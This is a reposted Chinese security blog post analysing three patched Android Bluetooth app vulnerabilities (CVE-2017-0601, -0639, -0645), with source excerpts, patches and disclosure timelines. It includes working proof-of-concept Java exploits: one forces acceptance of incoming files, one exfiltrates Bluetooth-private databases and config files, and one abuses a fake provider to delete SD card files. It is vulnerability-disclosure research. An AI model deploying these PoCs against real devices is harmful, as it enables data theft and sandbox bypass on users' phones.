---
title: 蓝牙App系列漏洞原理分析与漏洞利用
date: 2018-10-01 09:49:25
tags: Android漏洞
categories: 
	- Android安全
	- 漏洞分析
---

> 作者: heeeeen
> 
> 本文系转载，目的是学习，如有侵权，请联系删除
> 
> 转载出处:http://www.ms509.com/

## 蓝牙App漏洞系列分析之一CVE-2017-0601
### 0x01 概要

2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下：

    CVE: CVE-2017-0601
    BugID: A-35258579
    严重性: 中
    影响的Google设备: All
    Updated AOSP versions: 7.0, 7.1.1, 7.1.2

### 0x02 漏洞分析

蓝牙App暴露了一个广播接收器com.android.bluetooth.opp.BluetoothOppReceiver，本地普通App可以向这个Receiver发送广播，查看其OnReceive方法，包含了对多种传入广播Intent Action的处理，但是大多数Intent Action处于保护状态，简单用adb shell可以一一对其测试，比如

<!-- more -->

> adb shell am broadcast -a android.btopp.intent.action.OPEN

提示如下错误，说明action处于保护状态

``` xml
Broadcasting: Intent { act=android.btopp.intent.action.OPEN }
java.lang.SecurityException: Permission Denial: not allowed to send broadcast android.btopp.intent.action.OPEN from pid=26382, uid=2000
     at android.os.Parcel.readException(Parcel.java:1683)
     at android.os.Parcel.readException(Parcel.java:1636)
     at android.app.ActivityManagerProxy.broadcastIntent(ActivityManagerNative.java:3507)
     at com.android.commands.am.Am.sendBroadcast(Am.java:772)
     at com.android.commands.am.Am.onRun(Am.java:404)
     at com.android.internal.os.BaseCommand.run(BaseCommand.java:51)
     at com.android.commands.am.Am.main(Am.java:121)
     at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
     at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:262)
```

但是android.btopp.intent.action.ACCEPT这个Intent Action，却没有保护

> adb shell am broadcast -a  android.btopp.intent.action.ACCEPT

Broadcasting: Intent { act=android.btopp.intent.action.ACCEPT }
Broadcast completed: result=0

进一步分析AOSP代码，发现传入这个Action的Intent时，会将Intent携带Uri指向的db进行更新，更新为用户确认状态。

```java
 else if (action.equals(Constants.ACTION_ACCEPT)) {
            if (V) Log.v(TAG, "Receiver ACTION_ACCEPT");
            Uri uri = intent.getData();
            ContentValues values = new ContentValues();
            values.put(BluetoothShare.USER_CONFIRMATION, BluetoothShare.USER_CONFIRMATION_CONFIRMED);
            context.getContentResolver().update(uri, values, null, null);
            cancelNotification(context, uri);
```
这个db其实就是蓝牙文件共享的provider，对应的uri为content://con.android.bluetooth.opp/btopp，当通过蓝牙共享接收、发送文件时，该数据库都会增加新的条目，记录接收、发送的状态。该provider记录的信息可以参考BluetoothShare
	
```java
/**
* Exposes constants used to interact with the Bluetooth Share manager's content
* provider.
* @hide
*/
public final class BluetoothShare implements BaseColumns {
    private BluetoothShare() {
    }
    /**
     * The permission to access the Bluetooth Share Manager
     */
    public static final String PERMISSION_ACCESS = "android.permission.ACCESS_BLUETOOTH_SHARE";
    /**
     * The content:// URI for the data table in the provider
     */
    public static final Uri CONTENT_URI = Uri.parse("content://com.android.bluetooth.opp/btopp");
```

因此，如果我们在Intent中传入某个蓝牙共享对应文件的uri，那么它在蓝牙文件共享Provider中的状态就会被更改为用户确认状态。这里继续进行猜想，进一步，如果我们刚好通过蓝牙传入某个文件，将其状态改为用户确认，是否文件就无需确认，自动接收了呢？幸运的是，的确如此。

### 0x03 漏洞利用

这里还有一个问题要解决，content://com.android.bluetooth.opp/btopp只是整个provider的uri，我们如何知道刚刚通过蓝牙传入文件的uri呢？通过暴力穷举，下面的PoC简单地解决了这个问题，

``` java
public class MainActivity extends AppCompatActivity {
    Button m_btnAccept = null;
    public static final String ACTION_ACCEPT = "android.btopp.intent.action.ACCEPT";
    public static final String BLUETOOTH_SHARE_URI = "content://com.android.bluetooth.opp/btopp/";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        m_btnAccept = (Button)findViewById(R.id.accept);
        m_btnAccept.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.android.bluetooth",
                        "com.android.bluetooth.opp.BluetoothOppReceiver"));
                intent.setAction(ACTION_ACCEPT);
                // Guess the incoming bluetooth share uri, normally it increases from 1 by 1 and could be guessed easily.
                // Then Send broadcast to change the incoming file status
                for (int i = 0 ; i < 255; i++) {
                    String uriString = BLUETOOTH_SHARE_URI + Integer.toString(i);
                    intent.setData(Uri.parse(uriString));
                    sendBroadcast(intent);
                }
            }
        });
    }
}
```

### 0x04 测试方法

通过蓝牙向测试手机发送文件，此时，手机将会出现提示，要用户拒绝或者接受，这个对话框将会出现约1分钟

Bluetooth Transfer PendingBluetooth Transfer Pending

此时运行POC，文件将会自动接收，因此这是一个本地用户交互绕过。如果有恶意程序利用该漏洞一直在后台运行，那么手机将会被强制接收任意蓝牙传入的文件。

### 0x05 修复

Google在Framework的AndroidManifest文件中，将android.btopp.intent.action.ACCEPT和DELINE设为保护状态，普通App无法发出携带这些action的Intent

``` txt
diff --git a/core/res/AndroidManifest.xml b/core/res/AndroidManifest.xml
index ec712bb..011884c 100644
--- a/core/res/AndroidManifest.xml
+++ b/core/res/AndroidManifest.xml
@@ -199,6 +199,8 @@
     <protected-broadcast android:name="android.btopp.intent.action.OPEN_INBOUND" />    
     <protected-broadcast android:name="android.btopp.intent.action.TRANSFER_COMPLETE" />
     <protected-broadcast android:name="com.android.bluetooth.gatt.REFRESH_BATCHED_SCAN" />
+    <protected-broadcast android:name="android.btopp.intent.action.ACCEPT" />
+    <protected-broadcast android:name="android.btopp.intent.action.DECLINE" />
     <protected-broadcast android:name="com.android.bluetooth.pbap.authchall" />
     <protected-broadcast android:name="com.android.bluetooth.pbap.userconfirmtimeout" />  
     <protected-broadcast android:name="com.android.bluetooth.pbap.authresponse" />
```

### 0x06 时间线

    2017.02.09——提交Google
    2017.03.01——漏洞确认
    2017.05.01——补丁发布
    2017.05.04——漏洞公开

## 蓝牙App漏洞系列分析之二CVE-2017-0639

### 0x01 漏洞简介

Android本月的安全公告，修复了我们发现的另一个蓝牙App信息泄露漏洞，该漏洞允许攻击者获取 bluetooth用户所拥有的私有文件，绕过了将应用数据与其他应用隔离的操作系统防护功能。

漏洞信息如下：

    CVE: CVE-2017-0639
    BugID: A-35310991
    严重性: 高危
    漏洞类型: 信息泄露
    Updated AOSP versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2

### 0x02 漏洞缘起

在发现这个漏洞之前，我浏览了Android 2017年2月的安全公告，其中两个并排的高危信息泄露漏洞引起了我的注意：

    CVE-2017-0420: AOSP邮件中的信息泄露漏洞
    CVE-2017-0414: AOSP短信中的信息泄露漏洞

查看这两个信息漏洞的补丁注释，分别为

    Don’t allow file attachment from /data through GET_CONTENT
    Thirdparty can
    attach private files from “/data/data/com.android.messaging/“
    directory to the messaging app。

涵义非常清晰，似乎邮件和短信App均遗漏了对发送的文件进行验证，本地攻击者可以添加App私有目录的数据文件发送出去，从而破坏了Android沙箱所提供的应用数据相互隔离的安全防护功能。

这两个漏洞可以归纳为一类针对具有对外发送或共享功能App的攻击，Android中会不会还有类似的功能具有类似的漏洞？另外，注意到上述两个漏洞的发现者并非一人，只是巧合地同时出现在2月份的安全公告之中，发现者似乎还没有意识到这类攻击的通用性，也许真的还没有搜刮干净？
### 0x03 攻击面——蓝牙的信息分享

除了短信、邮件，很容易想到蓝牙也是Android一个很重要的信息对外发送出口。通常，我们选择一个文件的分享按钮，选择蓝牙，就可以触发蓝牙的文件发送功能，这是通过蓝牙App暴露的BluetoothOppLauncherActivity所实现。该Activity根据传入的Intent.ACTION_SEND或
Intent.ACTION_SEND_MULTIPLE，启动一个线程处理单个文件或多个文件的对外发送。主要代码如下

	
```java
/*
  * Other application is trying to share a file via Bluetooth,
  * probably Pictures, videos, or vCards. The Intent should contain
  * an EXTRA_STREAM with the data to attach.
  */
 if (action.equals(Intent.ACTION_SEND)) {
     // TODO: handle type == null case
     final String type = intent.getType();
     final Uri stream = (Uri)intent.getParcelableExtra(Intent.EXTRA_STREAM);
     CharSequence extra_text = intent.getCharSequenceExtra(Intent.EXTRA_TEXT);
     // If we get ACTION_SEND intent with EXTRA_STREAM, we'll use the
     // uri data;
     // If we get ACTION_SEND intent without EXTRA_STREAM, but with
     // EXTRA_TEXT, we will try send this TEXT out; Currently in
     // Browser, share one link goes to this case;
     if (stream != null && type != null) {
         if (V) Log.v(TAG, "Get ACTION_SEND intent: Uri = " + stream + "; mimetype = "
                     + type);
         // Save type/stream, will be used when adding transfer
         // session to DB.
         Thread t = new Thread(new Runnable() {
             public void run() {
                 BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.this)
                     .saveSendingFileInfo(type,stream.toString(), false);
                 //Done getting file info..Launch device picker and finish this activity
                     launchDevicePicker();
                     finish();
                 }
             });
             t.start();
             return;
         } else {
             Log.w(TAG,"Error trying to do set text...File not created!");
             finish();
             return;
         }
     } else {
         Log.e(TAG, "type is null; or sending file URI is null");
         finish();
         return;
     }
 } else if (action.equals(Intent.ACTION_SEND_MULTIPLE)) {
     final String mimeType = intent.getType();
     final ArrayList<Uri> uris = intent.getParcelableArrayListExtra(Intent.EXTRA_STREAM);
     if (mimeType != null && uris != null) {
         if (V) Log.v(TAG, "Get ACTION_SHARE_MULTIPLE intent: uris " + uris + "\n Type= "
                     + mimeType);
         Thread t = new Thread(new Runnable() {
             public void run() {
                 BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.this)
                     .saveSendingFileInfo(mimeType,uris, false);
                 //Done getting file info..Launch device picker
                 //and finish this activity
                 launchDevicePicker();
                 finish();
             }
         });
         t.start();
```

那么，传入蓝牙App私有数据试试！先寻找bluetooth所拥有的私有文件，

> angler:/ # find /data -user bluetooth -exec ls -al {} \; 2> /dev/null

可以选定两个bluetooth所拥有、有实质内容的文件作为发送对象，file:///data/user_de/0/com.android.bluetooth/databases/btopp.db和file:///data/misc/bluedroid/bt_config.conf

很快可以写出PoC

```java
public class MainActivity extends AppCompatActivity {
    Button m_btnSendPriv = null;
    Button m_btnSendMPriv = null;
    private final static String PRIV_FILE_URI1 = "file:///data/user_de/0/com.android.bluetooth/databases/btopp.db";
    private final static String PRIV_FILE_URI2 = "file:///data/misc/bluedroid/bt_config.conf";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        m_btnSendPriv = (Button)findViewById(R.id.send_private);
        m_btnSendPriv.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(Intent.ACTION_SEND);
                intent.setType("text/plain");
                Uri uri = Uri.parse(PRIV_FILE_URI1);
                intent.putExtra(Intent.EXTRA_STREAM, uri);
                intent.setComponent(new ComponentName("com.android.bluetooth",
                     "com.android.bluetooth.opp.BluetoothOppLauncherActivity"));
                startActivity(intent);
            }
        });
        m_btnSendMPriv = (Button)findViewById(R.id.send_private_multiple);
        m_btnSendMPriv.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
                intent.setType("text/plain");
                ArrayList<Uri> uris = new ArrayList<Uri>();
                uris.add(Uri.parse(PRIV_FILE_URI1));
                uris.add(Uri.parse(PRIV_FILE_URI2));
                intent.putExtra(Intent.EXTRA_STREAM, uris);
                intent.setComponent(new ComponentName("com.android.bluetooth",
                    "com.android.bluetooth.opp.BluetoothOppLauncherActivity"));
                startActivity(intent);
            }
        });
    }
}
```

### 0x04 进一步分析

真的那么简单吗？编译PoC，运行却抛出了安全异常！

``` log
--------- beginning of crash
06-12 10:32:43.930 16171 16171 E AndroidRuntime: FATAL EXCEPTION: main
06-12 10:32:43.930 16171 16171 E AndroidRuntime: Process: ms509.com.testaospbluetoothopplauncher, PID: 16171
06-12 10:32:43.930 16171 16171 E AndroidRuntime: android.os.FileUriExposedException: file:///data/user_de/0/com.android.bluetooth/databases/btopp.db exposed beyond app through ClipData.Item.getUri()
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.os.StrictMode.onFileUriExposed(StrictMode.java:1799)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.net.Uri.checkFileUriExposed(Uri.java:2346)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.content.ClipData.prepareToLeaveProcess(ClipData.java:832)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.content.Intent.prepareToLeaveProcess(Intent.java:8909)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.content.Intent.prepareToLeaveProcess(Intent.java:8894)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.app.Instrumentation.execStartActivity(Instrumentation.java:1517)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.app.Activity.startActivityForResult(Activity.java:4224)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.support.v4.app.BaseFragmentActivityJB.startActivityForResult(BaseFragmentActivityJB.java:50)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.support.v4.app.FragmentActivity.startActivityForResult(FragmentActivity.java:79)
06-12 10:32:43.930 16171 16171 E AndroidRuntime: 	at android.app.Activity.startActivityForResult(Activity.java:4183)
```

原来触发了FileUriExposed错误，出于安全考虑，Android SDK 23以上就不能在Intent中传递file:// Uri，见官方说明：

对于面向 Android 7.0 的应用，Android 框架执行的 StrictMode API 政策禁止在您的应用外部公开 file:// URI。如果一项包含文件 URI 的 intent 离开您的应用，则应用出现故障，并出现 FileUriExposedException 异常。要在应用间共享文件，您应发送一项 content:// URI，并授予 URI 临时访问权限。进行此授权的最简单方式是使用 FileProvider 类。

似乎宣判了死刑！心有不甘，继续分析BluetoothOppLauncherActivity后面的文件处理流程，调用链为saveSendingFileInfo–> generateFileInfo，查看generateFileInfo函数，我们发现其实是支持传入file:// URI的。

	
```java
public static BluetoothOppSendFileInfo generateFileInfo(Context context, Uri uri,
        String type) {
    ContentResolver contentResolver = context.getContentResolver();
    String scheme = uri.getScheme();
    String fileName = null;
    String contentType;
    long length = 0;
    // Support all Uri with "content" scheme
    // This will allow more 3rd party applications to share files via
    // bluetooth
    if ("content".equals(scheme)) {
        contentType = contentResolver.getType(uri);
        Cursor metadataCursor;
        try {
            metadataCursor = contentResolver.query(uri, new String[] {
                    OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
            }, null, null, null);
        } catch (SQLiteException e) {
            // some content providers don't support the DISPLAY_NAME or SIZE columns
            metadataCursor = null;
        } catch (SecurityException e) {
            Log.e(TAG, "generateFileInfo: Permission error, could not access URI: " + uri);
            return SEND_FILE_INFO_ERROR;
        }
        if (metadataCursor != null) {
            try {
                if (metadataCursor.moveToFirst()) {
                    fileName = metadataCursor.getString(
                            metadataCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));
                    length = metadataCursor.getLong(
                            metadataCursor.getColumnIndex(OpenableColumns.SIZE));
                    if (D) Log.d(TAG, "fileName = " + fileName + " length = " + length);
                }
            } finally {
                metadataCursor.close();
            }
        }
        if (fileName == null) {
            // use last segment of URI if DISPLAY_NAME query fails
            fileName = uri.getLastPathSegment();
        }
    } else if ("file".equals(scheme)) { // Notice!!!
        fileName = uri.getLastPathSegment();
        contentType = type;
        File f = new File(uri.getPath());
        length = f.length();
    } else {
        // currently don't accept other scheme
        return SEND_FILE_INFO_ERROR;
```

进一步查阅相关资料发现，原来FileUriExposed错误只是SDK引入的一项安全机制，仅仅是为了防止Intent的接收方访问发起方的私有文件。但是在我们这种攻击场景下，我们是要Intent的接收方BluetoothOppLauncherActivity访问其自己的私有文件，而且查看上述代码，既有对file:// URI的支持，也缺乏对文件是否属于私有目录的验证，Why not?

既然是SDK 23以后引入的安全机制，那么我们把build.gradle中的targetSdkVersion从原先的25改为23，重新编译运行，就可以将Bluetooth App的私有文件通过蓝牙发送出去，而这些文件原本连用户均无法获取，这就打破了Android沙箱的应用间数据隔离机制。至此，大功告成！
success

### 0x05 时间线

    2017.02.13: 提交Google
    2017.03.01: 漏洞确认，初始评级为高
    2017.06.05: 补丁发布
    2017.06.12: 漏洞公开



## 蓝牙App漏洞系列分析之三CVE-2017-0645

### 0x01 漏洞简介

Android 6月的安全公告，同时还修复了我们发现的一个蓝牙 App 提权中危漏洞，该漏洞允许手机本地无权限的恶意程序构造一个仿冒的 Provider ，并获取 Provider 所指向文件的读写权限，可用于写 SD 卡或者蓝牙共享数据库，漏洞详情如下：

    CVE: CVE-2017-0645
    BugID: A-35310991
    严重性: 中危
    漏洞类型: 提权
    Updated AOSP versions: 6.0.1, 7.0, 7.1.1, 7.1.2

### 0x02 漏洞分析

该漏洞其实是一个常规的 Android 组件暴露漏洞，跟我们上一个分析的蓝牙漏洞一样，我们知道在蓝牙 App 中 BluetoothOppLauncherActivity 是可以被第三方应用启动的。这一次，我们来看 onCreate 函数中传入 Intent action 为 android.btopp.intent.action.OPEN 的处理流程。

``` java
else if (action.equals(Constants.ACTION_OPEN)) {
    Uri uri = getIntent().getData();
    if (V) Log.v(TAG, "Get ACTION_OPEN intent: Uri = " + uri);

    Intent intent1 = new Intent();
    intent1.setAction(action);
    intent1.setClassName(Constants.THIS_PACKAGE_NAME, BluetoothOppReceiver.class.getName());
    intent1.setDataAndNormalize(uri);
    this.sendBroadcast(intent1);
    finish();
 }
```

转到 BluetoothOppReceiver 进行处理。接着查看 BluetoothOppReceiver 的 onReceive 函数，由于Intent 可控，这里蓝牙 App 将会取出 intent 中的 Data 进行数据库查询，然后取出 transInfo ，最后进入 BluetoothOppUtility.openReceivedFile 函数。

``` java
        } else if (action.equals(Constants.ACTION_OPEN) || action.equals(Constants.ACTION_LIST)) {
            if (V) {
                if (action.equals(Constants.ACTION_OPEN)) {
                    Log.v(TAG, "Receiver open for " + intent.getData());
                } else {
                    Log.v(TAG, "Receiver list for " + intent.getData());
                }
            }

            BluetoothOppTransferInfo transInfo = new BluetoothOppTransferInfo();
            Uri uri = intent.getData();  //Intent可控！
            transInfo = BluetoothOppUtility.queryRecord(context, uri);
            if (transInfo == null) {
                Log.e(TAG, "Error: Can not get data from db");
                return;
            }

            if (transInfo.mDirection == BluetoothShare.DIRECTION_INBOUND
                    && BluetoothShare.isStatusSuccess(transInfo.mStatus)) {
                // if received file successfully, open this file
                // transInfo可控！
                BluetoothOppUtility.openReceivedFile(context, transInfo.mFileName,
                        transInfo.mFileType, transInfo.mTimeStamp, uri);
                BluetoothOppUtility.updateVisibilityToHidden(context, uri);
            } else {
                Intent in = new Intent(context, BluetoothOppTransferActivity.class);
                in.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                in.setDataAndNormalize(uri);
                context.startActivity(in);
            }
```

在 openReceivedFile 函数中，我们看到蓝牙 App 最终将在授予读写权限后，启动能够处理 transInfo.mFileType 文件类型的某外部 App 的 Activity ，对 transInfo.mFileName 进行处理。

```java

    public static void openReceivedFile(Context context, String fileName, String mimetype,
            Long timeStamp, Uri uri) {
        if (fileName == null || mimetype == null) {
            Log.e(TAG, "ERROR: Para fileName ==null, or mimetype == null");
            return;
        }

        File f = new File(fileName); //fileName可控
        if (!f.exists()) {
        ...
        // skip
       }

       // path受限于com.google.android.bluetooth.fileprovider使用的位置

        Uri path = FileProvider.getUriForFile(context,
                       "com.google.android.bluetooth.fileprovider", f);

        // If there is no scheme, then it must be a file
        if (path.getScheme() == null) {
            path = Uri.fromFile(new File(fileName));
        }

        if (isRecognizedFileType(context, path, mimetype)) {
            Intent activityIntent = new Intent(Intent.ACTION_VIEW);
            activityIntent.setDataAndTypeAndNormalize(path, mimetype);

            List<ResolveInfo> resInfoList = context.getPackageManager()
                .queryIntentActivities(activityIntent,
                        PackageManager.MATCH_DEFAULT_ONLY);

            // 注意这段，授予任何app对该文件的读写权限
            // Grant permissions for any app that can handle a file to access it
            for (ResolveInfo resolveInfo : resInfoList) {
                String packageName = resolveInfo.activityInfo.packageName;
                context.grantUriPermission(packageName, path,
                        Intent.FLAG_GRANT_WRITE_URI_PERMISSION |
                        Intent.FLAG_GRANT_READ_URI_PERMISSION);
            }

            activityIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            // 授予activity对该文件的读写权限
            activityIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            activityIntent.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);

            try {
                if (V) Log.d(TAG, "ACTION_VIEW intent sent out: " + path + " / " + mimetype);
                context.startActivity(activityIntent); 
```

由于 Intent 可控， Intent Data 可控， transInfo 可控，再加上启动的外部 App 被授予了读写权限，因此这里存在漏洞，我们可以伪造一个文件让蓝牙 App 启动某外部 App 打开，同时该外部 App 获得对伪造文件指向位置的读写权限。可惜此处伪造的文件位置受限于 com.android.bluetooth.filepovider ，其 file_paths.xml 使用的 external-path ，这意味着我们只能伪造一个外部存储 /sdcard 目录的文件。

### 0x03 漏洞利用

漏洞利用可如下图所示，这种攻击发送 intent 的过程像极了飞去来器。恶意 App 发送 intent 过后,又回到了自己手中，但却获得了提权。

1.恶意 App 声明能对某种 filetype 进行处理

```xml
        <activity android:name=".FakeViewActivity">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="xxx/yyy" />
            </intent-filter>
        </activity>
```

2.构造一个虚假的 bluetooth share provider——FakeBluetoothOppProvider ，传入 intent data 之中。主要内容可以参考 BluetoothOppProvider ，其 Uri 为

content://fake.bluetooth.provider/btopp/

并expose出来

<provider
            android:authorities="fake.bluetooth.provider"
            android:name=".FakeBluetoothOppProvider"
            android:exported="true" />

然后填入内容，指向 /sdcard 中某个已知文件，并传入 Intent data , 启动 BluetoothOppLauncherActivity

``` java
        m_btnTest.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setComponent(new ComponentName("com.android.bluetooth",
                        "com.android.bluetooth.opp.BluetoothOppLauncherActivity"));
                intent.setAction(Constants.ACTION_OPEN);
                intent.setData(Uri.parse("content://fake.bluetooth.provider/btopp/1"));
                startActivity(intent);

            }
        });

        m_btnAddFakeEntry = (Button)findViewById(R.id.add);
        m_btnAddFakeEntry.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ContentValues values = new ContentValues();
                values.put(BluetoothShare._ID, 1);
                values.put(BluetoothShare.DIRECTION, BluetoothShare.DIRECTION_INBOUND);
               values.put(BluetoothShare.TOTAL_BYTES, 110000);
                values.put(BluetoothShare.CURRENT_BYTES,110000);
                values.put(BluetoothShare.TIMESTAMP, 111111);
                values.put(BluetoothShare.DESTINATION, "00:10:60:AA:36:F8");
                values.put(BluetoothShare._DATA, "/storage/emulated/0/CVE-2016-6762.apk");
               values.put(BluetoothShare.MIMETYPE, "xxx/yyy");

                values.put(BluetoothShare.USER_CONFIRMATION, 1);

                // when content provider is null, use insert or use update

                m_contentResolver.insert(BluetoothShare.CONTENT_URI, values);
               // m_contentResolver.update(BluetoothShare.CONTENT_URI, values, "_id = 12", null);

            }
        });
```

3.蓝牙 App 取出我们构造的 filename, filetype；
4.蓝牙 App 授予读写权限，然后再启动恶意 App 进行处理;
5.恶意 App 直接删除 /sdcard 中的这个文件。

``` java
public class FakeViewActivity extends Activity {
    final static String TAG = "Bluz";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        String dir = intent.getDataString();
        Log.d(TAG, "dir is "+dir);
        Uri uri = intent.getData();
        ContentResolver cr = getContentResolver();
       Log.d(TAG, "Deleting "+ intent.getDataString() +" silently!");
        getContentResolver().delete(uri, null, null);
    }
}
```

在上述整个过程中，恶意 App 并未申请 SD 卡写权限，因此这是一个提权漏洞。

另外还有一种利用方式，是在 Intent 中直接传入蓝牙 BluetoothOppProvider 的 uri ，比如 content://com.android.bluetooth.opp/btopp/1" ，从而获得对蓝牙共享数据库的读写权限。

完整代码请见[这里](https://github.com/heeeeen/CVE-PoC/tree/master/CVE-2017-0645)
### 0x04 漏洞修复

Google 对该漏洞的[修复](https://android.googlesource.com/platform/packages/apps/Bluetooth/+/14b7d7e1537af60b7bca6c7b9e55df0dc7c6bf41%5E%21/#F0)主要有两点:

1.确保 Intent data 始终为 BluetoothOppProvider 的 Uri ，防止仿冒； 2.撤销了授予第三方应用的读写权限，只授予第三方应用某个 Activity 的读权限。
### 0x05 时间线

    2017.02.15: 漏洞提交
    2017.03.01: 漏洞确认，初始评级为高
    2017.03.23: 漏洞降级为中
    2017.06.01: 补丁发布
    2017.06.23: 漏洞公开
    
  

